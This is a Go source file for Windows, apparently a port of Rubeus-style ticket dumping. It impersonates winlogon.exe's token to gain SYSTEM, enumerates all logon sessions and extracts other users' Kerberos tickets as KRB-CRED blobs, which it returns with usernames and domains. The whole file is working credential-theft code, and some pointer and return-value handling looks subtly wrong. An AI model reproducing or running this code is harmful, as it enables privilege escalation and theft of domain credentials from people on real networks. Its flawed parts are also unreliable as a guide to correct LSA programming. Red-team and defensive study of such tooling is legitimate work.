//go:build windows
// +build windows

package gkirby

import (
	"encoding/asn1"
	"fmt"
	"golang.org/x/sys/windows"
	"strings"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

// enums
type PrincipalName uint
type LogonType uint32
type TicketFlags uint32
type KerbProtocolMessageType uint32

const (
	NT_UNKNOWN        PrincipalName = iota
	NT_PRINCIPAL      PrincipalName = iota
	NT_SRV_INST       PrincipalName = iota
	NT_SRV_HST        PrincipalName = iota
	NT_SRV_XHST       PrincipalName = iota
	NT_UID            PrincipalName = iota
	NT_X500_PRINCIPAL PrincipalName = iota
	NT_SMTP_NAME      PrincipalName = iota
	NT_ENTERPRISE     PrincipalName = iota
)

const (
	LOGON32_LOGON_INTERACTIVE       LogonType = 2
	LOGON32_LOGON_NETWORK           LogonType = 3
	LOGON32_LOGON_BATCH             LogonType = 4
	LOGON32_LOGON_SERVICE           LogonType = 5
	LOGON32_LOGON_UNLOCK            LogonType = 7
	LOGON32_LOGON_NETWORK_CLEARTEXT LogonType = 8
	LOGON32_LOGON_NEW_CREDENTIALS   LogonType = 9
)

const (
	TicketReserved         TicketFlags = 0x80000000
	TicketForwardable      TicketFlags = 0x40000000
	TicketForwarded        TicketFlags = 0x20000000
	TicketProxiable        TicketFlags = 0x10000000
	TicketProxy            TicketFlags = 0x08000000
	TicketMayPostdate      TicketFlags = 0x04000000
	TicketPostdated        TicketFlags = 0x02000000
	TicketInvalid          TicketFlags = 0x01000000
	TicketRenewable        TicketFlags = 0x00800000
	TicketInitial          TicketFlags = 0x00400000
	TicketPreAuthent       TicketFlags = 0x00200000
	TicketHWAuthent        TicketFlags = 0x00100000
	TicketOkAsDelegate     TicketFlags = 0x00040000
	TicketAnonymous        TicketFlags = 0x00020000
	TicketNameCanonicalize TicketFlags = 0x00010000
)

func (t TicketFlags) String() string {
	var flags []string

	flagMap := map[TicketFlags]string{
		TicketReserved:         "reserved",
		TicketForwardable:      "forwardable",
		TicketForwarded:        "forwarded",
		TicketProxiable:        "proxiable",
		TicketProxy:            "proxy",
		TicketMayPostdate:      "may_postdate",
		TicketPostdated:        "postdated",
		TicketInvalid:          "invalid",
		TicketRenewable:        "renewable",
		TicketInitial:          "initial",
		TicketPreAuthent:       "pre_authent",
		TicketHWAuthent:        "hw_authent",
		TicketOkAsDelegate:     "ok_as_delegate",
		TicketAnonymous:        "anonymous",
		TicketNameCanonicalize: "name_canonicalize",
	}

	for flag, name := range flagMap {
		if t&flag != 0 {
			flags = append(flags, name)
		}
	}

	if len(flags) == 0 {
		return "empty"
	}

	return strings.Join(flags, ", ")
}

const (
	KerbQueryTicketCacheExMessage    KerbProtocolMessageType = 14
	KerbRetrieveEncodedTicketMessage KerbProtocolMessageType = 8
)

type SessionCred struct {
	LogonSession LogonSessionData
	Tickets      []KrbTicket
}

type KrbTicket struct {
	StartTime      time.Time
	EndTime        time.Time
	RenewTime      time.Time
	TicketFlags    TicketFlags
	EncryptionType int32
	ServerName     string
	ServerRealm    string
	ClientName     string
	ClientRealm    string
	KrbCred        *KrbCred
}

type KrbCred struct {
	Pvno    int64          `asn1:"explicit,tag:0"`
	MsgType int64          `asn1:"explicit,tag:1"`
	Tickets []Ticket       `asn1:"explicit,tag:2"`
	EncPart EncKrbCredPart `asn1:"explicit,tag:3"`
}

type Ticket struct {
	Realm   string        `asn1:"explicit,tag:1"`
	SName   PrincipalName `asn1:"explicit,tag:2"`
	EncPart EncryptedData `asn1:"explicit,tag:3"`
}

type EncryptedData struct {
	EType  int32  `asn1:"explicit,tag:0"`
	KVNO   int32  `asn1:"optional,explicit,tag:1"`
	Cipher []byte `asn1:"explicit,tag:2"`
}

type EncKrbCredPart struct {
	TicketInfo []KrbCredInfo `asn1:"explicit,tag:0"`
}

type KrbCredInfo struct {
	key       *EncryptionKey
	pRealm    string
	pName     *PrincipalNameData
	flags     uint32
	authTime  string
	startTime string
	endTime   string
	renewTill string
	sRealm    string
	sName     *PrincipalNameData
	cAddr     *HostAddresses
}

type Elevation struct {
	TokenIsElevated uint32
}

type TokenStatistics struct {
	TokenID            windows.LUID
	AuthenticationId   windows.LUID
	ExpirationTime     int64
	TokenType          uint32
	ImpersonationLevel uint32
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedId         windows.LUID
}

type SecurityLogonSessionData struct {
	Size                  uint32
	LoginID               windows.LUID
	Username              LsaString
	LoginDomain           LsaString
	AuthenticationPackage LsaString
	LogonType             uint32
	Session               uint32
	PSiD                  uintptr
	LoginTime             uint64
	LogonServer           LsaString
	DnsDomainName         LsaString
	Upn                   LsaString
}

type PrincipalNameData struct {
	nameType   PrincipalName
	nameString []string
}

type EncryptionKey struct {
	keyType  int32
	keyValue []byte
}

type HostAddresses []HostAddress

type HostAddress struct {
	addrType    int32
	addressData []byte
}

type LsaString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type LogonSessionData struct {
	LogonID               windows.LUID
	Username              string
	LogonDomain           string
	AuthenticationPackage string
	LogonType             LogonType
	Session               int32
	Sid                   *windows.SID
	LogonTime             time.Time
	LogonServer           string
	DnsDomainName         string
	Upn                   string
}

type KerbQueryTktCacheRequest struct {
	MessageType KerbProtocolMessageType
	_           uint32
	LogonId     windows.LUID
}

type QueryTktCacheResponse struct {
	MessageType    KerbProtocolMessageType
	CountOfTickets uint32
	Tickets        [1]KerbTicketCacheInfoEx
}

type KerbTicketCacheInfoEx struct {
	ClientName     LsaString
	ClientRealm    LsaString
	ServerName     LsaString
	ServerRealm    LsaString
	StartTime      int64
	EndTime        int64
	RenewTime      int64
	EncryptionType int32
	TicketFlags    uint32
}

type KerbRetrieveTktRequest struct {
	MessageType    KerbProtocolMessageType
	_              uint32
	LogonId        windows.LUID
	TicketFlags    uint32
	CacheOptions   uint32
	EncryptionType int64
	TargetName     LsaString
}

type KerbRetrieveTktResponse struct {
	MessageType KerbProtocolMessageType
	Ticket      KerbExternalTicket
}

type KerbExternalTicket struct {
	ServiceName         LsaString
	TargetName          LsaString
	ClientName          LsaString
	DomainName          LsaString
	TargetDomainName    LsaString
	AltTargetDomainName LsaString
	SessionKey          KerbCryptoKey
	TicketFlags         uint32
	Flags               uint32
	KeyExpirationTime   int64
	StartTime           int64
	EndTime             int64
	RenewUntil          int64
	TimeSkew            int64
	EncodedTicketSize   int32
	EncodedTicket       uintptr
}

type KerbCryptoKey struct {
	KeyType int32
	Length  int32
	Value   uintptr
}

// kerberos globals
const (
	KerbRetrieveTicketAsKerbCred = 0x8
)

// dll imports
var (
	secur32                        = windows.NewLazyDLL("secur32.dll")
	advapi32                       = windows.NewLazyDLL("advapi32.dll")
	LsaConnectUntrusted            = secur32.NewProc("LsaConnectUntrusted")
	LsaLookupAuthenticationPackage = secur32.NewProc("LsaLookupAuthenticationPackage")
	LsaCallAuthenticationPackage   = secur32.NewProc("LsaCallAuthenticationPackage")
	LsaGetLogonSessionData         = secur32.NewProc("LsaGetLogonSessionData")
	LsaFreeReturnBuffer            = secur32.NewProc("LsaFreeReturnBuffer")
	LsaEnumerateLogonSessions      = secur32.NewProc("LsaEnumerateLogonSessions")
	ImpersonateLoggedOnUser        = advapi32.NewProc("ImpersonateLoggedOnUser")
	RevertToSelf                   = advapi32.NewProc("RevertToSelf")
)

const (
	windowsToUnixEpochIntervals = 116444736000000000
)

/*
misc helper funcs
*/
func fileTimeToTime(fileTime int64) time.Time {
	nsec := (fileTime - windowsToUnixEpochIntervals) * 100
	return time.Unix(0, nsec).Local()
}

/*
asn.1 helper funcs
*/

func parseTicketData(encodedTicket []byte) (*KrbCred, error) {
	var krbCred KrbCred
	rest, err := asn1.UnmarshalWithParams(encodedTicket, &krbCred, "application,tag:22")
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal KRB-CRED: %v", err)
	}
	if len(rest) > 0 {
		return nil, fmt.Errorf("extra data after KRB-CRED")
	}
	return &krbCred, nil
}

/*
kerberos helper funcs
*/
func newKRBCred() *KrbCred {
	return &KrbCred{
		Pvno:    5,
		MsgType: 22,
		Tickets: []Ticket{},
		EncPart: EncKrbCredPart{
			TicketInfo: []KrbCredInfo{}, // Capital T in TicketInfo
		},
	}
}

func lsaStrToString(s LsaString) string {
	if s.Length == 0 {
		return ""
	}
	buf := make([]uint16, s.Length/2)
	copy(buf, (*[1 << 30]uint16)(unsafe.Pointer(s.Buffer))[:s.Length/2])
	return windows.UTF16ToString(buf)
}

func enumerateLogonSessions() ([]windows.LUID, error) {
	var count uint32
	var luids uintptr

	ret, _, _ := LsaEnumerateLogonSessions.Call(
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&luids)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaEnumerateLogonSessions failed with error: 0x%x", ret)
	}

	luidSlice := make([]windows.LUID, count)
	for i := uint32(0); i < count; i++ {
		luid := (*windows.LUID)(unsafe.Pointer(luids + uintptr(i)*unsafe.Sizeof(windows.LUID{})))
		luidSlice[i] = *luid
	}

	defer LsaFreeReturnBuffer.Call(luids)

	return luidSlice, nil
}

func getCurrentLUID() (windows.LUID, error) {
	var currentToken windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &currentToken)
	if err != nil {
		return windows.LUID{}, fmt.Errorf("OpenProcessToken failed with error: %v", err)
	}
	defer currentToken.Close()

	var tokenStats TokenStatistics
	var returnLength uint32

	err = windows.GetTokenInformation(currentToken, windows.TokenStatistics, (*byte)(unsafe.Pointer(&tokenStats)), uint32(unsafe.Sizeof(tokenStats)), &returnLength)
	if err != nil {
		return windows.LUID{}, fmt.Errorf("GetTokenInformation failed with error: %v", err)
	}

	return tokenStats.AuthenticationId, nil
}

func getLogonSessionData(luid windows.LUID) (*LogonSessionData, error) {
	var sessionDataPtr uintptr

	ret, _, _ := LsaGetLogonSessionData.Call(
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&sessionDataPtr)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaGetLogonSessionData failed with error: 0x%x", ret)
	}

	defer LsaFreeReturnBuffer.Call(sessionDataPtr)

	sessionData := (*SecurityLogonSessionData)(unsafe.Pointer(sessionDataPtr))

	result := &LogonSessionData{
		LogonID:               sessionData.LoginID,
		Username:              lsaStrToString(sessionData.Username),
		LogonDomain:           lsaStrToString(sessionData.LoginDomain),
		AuthenticationPackage: lsaStrToString(sessionData.AuthenticationPackage),
		LogonType:             LogonType(sessionData.LogonType),
		Session:               int32(sessionData.Session),
		LogonTime:             time.Unix(0, int64(sessionData.LoginTime)*100),
		LogonServer:           lsaStrToString(sessionData.LogonServer),
		DnsDomainName:         lsaStrToString(sessionData.DnsDomainName),
		Upn:                   lsaStrToString(sessionData.Upn),
	}

	if sessionData.PSiD != 0 {
		var sidStr *uint16
		err := windows.ConvertSidToStringSid((*windows.SID)(unsafe.Pointer(sessionData.PSiD)), &sidStr)
		if err == nil {
			result.Sid, _ = windows.StringToSid(windows.UTF16PtrToString(sidStr))
			windows.LocalFree(windows.Handle(unsafe.Pointer(sidStr)))
		}
	}

	return result, nil
}

func isAdmin() (bool, error) {
	var token windows.Token
	process, err := windows.GetCurrentProcess()
	if err != nil {
		return false, fmt.Errorf("GetCurrentProcess failed with error: %v", err)
	}

	err = windows.OpenProcessToken(process, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed with error: %v", err)
	}
	defer token.Close()

	var elevated uint32
	var size uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevated)), uint32(unsafe.Sizeof(elevated)), &size)
	if err != nil {
		return false, fmt.Errorf("GetTokenInformation failed with error: %v", err)
	}

	return elevated != 0, nil
}

func newLSAString(s string) *LsaString {
	bytes := []byte(s)
	return &LsaString{
		Length:        uint16(len(bytes)),
		MaximumLength: uint16(len(bytes)),
		Buffer:        uintptr(unsafe.Pointer(&bytes[0])),
	}
}

func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LUID, targetName string) (*KrbCred, error) {
	if lsaHandle == 0 {
		return nil, fmt.Errorf("invalid LSA handle")
	}

	request := KerbRetrieveTktRequest{
		MessageType:    KerbRetrieveEncodedTicketMessage,
		LogonId:        luid,
		TicketFlags:    0,
		CacheOptions:   KerbRetrieveTicketAsKerbCred,
		EncryptionType: 0,
	}

	utf16Bytes := windows.StringToUTF16(targetName)
	length := uint16(len(targetName) * 2)
	maxLength := length + 2

	structSize := unsafe.Sizeof(request)
	totalSize := structSize + uintptr(maxLength)

	buffer := make([]byte, totalSize)
	bufferPtr := unsafe.Pointer(&buffer[0])

	*(*KerbRetrieveTktRequest)(bufferPtr) = request

	var targetNamePtr uintptr
	targetNamePtrOffset := uintptr(24) // for 64-bit
	if unsafe.Sizeof(uintptr(0)) == 4 {
		targetNamePtrOffset = uintptr(16) // for 32-bit
	}
	*(*uintptr)(unsafe.Pointer(uintptr(bufferPtr) + targetNamePtrOffset)) = targetNamePtr

	targetNamePtr = uintptr(bufferPtr) + structSize
	copy((*[1 << 30]byte)(unsafe.Pointer(targetNamePtr))[:maxLength],
		unsafe.Slice((*byte)(unsafe.Pointer(&utf16Bytes[0])), maxLength))

	requestPtr := (*KerbRetrieveTktRequest)(bufferPtr)
	requestPtr.TargetName = LsaString{
		Length:        length,
		MaximumLength: maxLength,
		Buffer:        targetNamePtr,
	}

	var responsePtr uintptr
	var returnLength uint32
	var protocolStatus uint32

	ret, _, _ := LsaCallAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(authPackage),
		uintptr(bufferPtr),
		totalSize,
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&returnLength)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
	}

	if protocolStatus != 0 {
		return nil, fmt.Errorf("protocol status error: 0x%x", protocolStatus)
	}

	if responsePtr != 0 {
		defer LsaFreeReturnBuffer.Call(responsePtr)
		response := (*KerbRetrieveTktResponse)(unsafe.Pointer(responsePtr))
		encodedTicketSize := response.Ticket.EncodedTicketSize
		if encodedTicketSize > 0 {
			encodedTicket := make([]byte, encodedTicketSize)
			copy(encodedTicket,
				(*[1 << 30]byte)(unsafe.Pointer(response.Ticket.EncodedTicket))[:encodedTicketSize])

			krbCred, err := parseTicketData(encodedTicket)
			if err != nil {
				return nil, fmt.Errorf("failed to parse ticket data: %v", err)
			}
			return krbCred, nil
		}
	}

	return nil, fmt.Errorf("KRB_RETRIEVE_TKT_RESPONSE failed")
}

func enumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCred, error) {
	var luids []windows.LUID
	var sessionCreds []SessionCred
	isAdmin, err := isAdmin()
	if err != nil {
		return sessionCreds, fmt.Errorf("[-] failed to check if admin is enabled, err: %v\n", err)
	}
	if isAdmin {
		//fmt.Printf("[!] elevated token. listing sessionCreds for all users\n\n")
		luids, err = enumerateLogonSessions()
		if err != nil {
			return sessionCreds, fmt.Errorf("[-] failed to enumerate logon ids, err: %v\n", err)
		}
	} else {
		//fmt.Printf("[-] low priv token. listing sessionCreds for current user\n\n")
		luid, err := getCurrentLUID()
		if err != nil {
			return sessionCreds, fmt.Errorf("[-] failed to get current luid, err: %v\n", err)
		}
		luids = append(luids, luid)
	}

	for _, luid := range luids {
		//value := uint64(luid.HighPart)<<32 | uint64(luid.LowPart)
		//fmt.Printf("[+] current luid: 0x%x\n", value)

		sessionData, err := getLogonSessionData(luid)
		if err != nil {
			return sessionCreds, fmt.Errorf("[-] failed to get logon session data, err: %v\n", err)
		}

		var sessionCred SessionCred
		sessionCred.LogonSession = *sessionData
		sessionCred.Tickets = []KrbTicket{}

		var responsePtr uintptr
		pResponsePtr := unsafe.Pointer(&responsePtr)
		var returnLength = 0
		var protocolStatus = 0

		var ticketCacheRequest KerbQueryTktCacheRequest
		ticketCacheRequest.MessageType = KerbQueryTicketCacheExMessage

		if isAdmin {
			ticketCacheRequest.LogonId = sessionData.LogonID
		} else {
			// https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs#L303
			ticketCacheRequest.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
		}

		ret, _, err := LsaCallAuthenticationPackage.Call(
			uintptr(lsaHandle),
			uintptr(authPackage),
			uintptr(unsafe.Pointer(&ticketCacheRequest)),
			uintptr(unsafe.Sizeof(ticketCacheRequest)),
			uintptr(pResponsePtr),
			uintptr(unsafe.Pointer(&returnLength)),
			uintptr(unsafe.Pointer(&protocolStatus)),
		)
		if ret != 0 {
			return sessionCreds, fmt.Errorf("[-] LsaCallAuthenticationPackage failed, err: %v\n", err)
		}

		if responsePtr != 0 {
			defer LsaFreeReturnBuffer.Call(responsePtr)

			response := (*QueryTktCacheResponse)(unsafe.Pointer(responsePtr))

			if response.CountOfTickets > 0 {
				ticketSize := unsafe.Sizeof(KerbTicketCacheInfoEx{})

				for i := uint32(0); i < response.CountOfTickets; i++ {
					currentTicketPtr := responsePtr + 8 + uintptr(i)*ticketSize
					ticketInfo := (*KerbTicketCacheInfoEx)(unsafe.Pointer(currentTicketPtr))

					ticket := &KrbTicket{
						StartTime:      fileTimeToTime(ticketInfo.StartTime),
						EndTime:        fileTimeToTime(ticketInfo.EndTime),
						RenewTime:      fileTimeToTime(ticketInfo.RenewTime),
						TicketFlags:    TicketFlags(ticketInfo.TicketFlags),
						EncryptionType: ticketInfo.EncryptionType,
						ServerName:     lsaStrToString(ticketInfo.ServerName),
						ServerRealm:    lsaStrToString(ticketInfo.ServerRealm),
						ClientName:     lsaStrToString(ticketInfo.ClientName),
						ClientRealm:    lsaStrToString(ticketInfo.ClientRealm),
					}

					sessionCred.Tickets = append(sessionCred.Tickets, *ticket)
				}
			}
		}
		sessionCreds = append(sessionCreds, sessionCred)
	}

	return sessionCreds, nil
}

func isHighIntegrity() (bool, error) {
	var token windows.Token
	procHandle := windows.CurrentProcess()
	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	adminSID, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
	if err != nil {
		return false, fmt.Errorf("CreateWellKnownSid failed: %v", err)
	}

	isAdmin, err := token.IsMember(adminSID)
	if err != nil {
		return false, fmt.Errorf("IsMember failed: %v", err)
	}

	var elevation Elevation
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &returnedLen)
	if err != nil {
		return false, err
	}

	return isAdmin && elevation.TokenIsElevated != 0, nil
}

func isSystem() (bool, error) {
	var token windows.Token
	procHandle := windows.CurrentProcess()
	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err != nil {
		return false, fmt.Errorf("CreateWellKnownSid failed: %v", err)
	}

	isSystem, err := token.IsMember(systemSid)
	if err != nil {
		return false, fmt.Errorf("IsMember failed: %v", err)
	}

	return isSystem, nil
}

func getSystem() bool {
	isHighIntegrity, err := isHighIntegrity()
	if err != nil {
		return false
	}

	if !isHighIntegrity {
		//var token windows.Token
		snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
		if err != nil {
			return false
		}
		defer windows.CloseHandle(snapshot)

		var procEntry windows.ProcessEntry32
		procEntry.Size = uint32(unsafe.Sizeof(procEntry))
		if err := windows.Process32First(snapshot, &procEntry); err != nil {
			return false
		}

		for {
			processName := windows.UTF16ToString(procEntry.ExeFile[:])
			if processName == "winlogon.exe" {
				handle, err := windows.OpenProcess(
					PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
					false,
					procEntry.ProcessID,
				)
				if err != nil {
					// this might not be the best way to handle this, although winlogon should only occur once in the ptree i believe?
					return false
				}

				var token windows.Token
				err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE, &token)
				if err != nil {
					return false
				}
				defer token.Close()

				var duplicateToken windows.Token
				err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &duplicateToken)
				if err != nil {
					return false
				}

				ret, _, err := ImpersonateLoggedOnUser.Call(uintptr(token))
				if ret != 0 {
					fmt.Printf("error: %v", err)
				}

				fmt.Printf("token should be NT AUTHORITY\\SYSTEM now\n")
				return true
			}

			err = windows.Process32Next(snapshot, &procEntry)
			if err != nil {
				if err == windows.ERROR_NO_MORE_FILES {
					break
				}
				return false
			}
		}
		return false
	}
	return false
}

func getLsaHandle() (windows.Handle, error) {
	isHighIntegrity, err := isHighIntegrity()
	if err != nil {
		return 0, err
	}

	isSystem, err := isSystem()
	if err != nil {
		return 0, err
	}

	var lsaHandle windows.Handle
	if isHighIntegrity && !isSystem {
		// elevated, but not system. time to impersonate some tokens
		// todo: getSystem()
		gotSystem := getSystem()
		if gotSystem != true {
			fmt.Printf("getSystem failed: %v", err)
			return 0, err
		}

		ret, _, err := LsaConnectUntrusted.Call(
			uintptr(unsafe.Pointer(&lsaHandle)),
		)
		if ret != 0 {
			return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed with error: %v", err)
		}
	} else {
		ret, _, err := LsaConnectUntrusted.Call(
			uintptr(unsafe.Pointer(&lsaHandle)),
		)
		if ret != 0 {
			return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed with error: %v", err)
		}
	}

	return lsaHandle, nil
}

func getAuthenticationPackage(lsaHandle windows.Handle, lsaString *LsaString) (uint32, error) {
	var authPackage uint32

	ret, _, err := LsaLookupAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(unsafe.Pointer(lsaString)),
		uintptr(unsafe.Pointer(&authPackage)),
	)
	if ret != 0 {
		return authPackage, fmt.Errorf("LsaLookupAuthenticationPackage failed: %v", err)
	}

	return authPackage, nil
}

/*
* public bois
 */
func GetKerberosTickets() []map[string]interface{} {
	var ticketCache []map[string]interface{}
	lsaHandle, err := getLsaHandle()
	if err != nil {
		return nil
	}

	kerberosString := newLSAString("kerberos")
	authPackage, err := getAuthenticationPackage(lsaHandle, kerberosString)
	if err != nil {
		return nil
	}

	sessionCreds, err := enumerateTickets(lsaHandle, authPackage)
	if err != nil {
		return nil
	}

	ticketCache = make([]map[string]interface{}, 0)
	for _, cred := range sessionCreds {
		for _, ticket := range cred.Tickets {
			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
			if err != nil {
				continue
			}

			ticket := map[string]interface{}{
				"username":    cred.LogonSession.Username,
				"domain":      cred.LogonSession.LogonDomain,
				"logonId":     cred.LogonSession.LogonID.LowPart,
				"serverName":  ticket.ServerName,
				"serverRealm": ticket.ServerRealm,
				"startTime":   ticket.StartTime.Format(time.RFC3339),
				"endTime":     ticket.EndTime.Format(time.RFC3339),
				"renewTime":   ticket.RenewTime.Format(time.RFC3339),
				"flags":       ticket.TicketFlags.String(),
				"encType":     ticket.EncryptionType,
				"krbCred":     extractedTicket,
			}
			ticketCache = append(ticketCache, ticket)
		}
	}

	if len(ticketCache) > 0 {
		return ticketCache
	}
	return nil
}
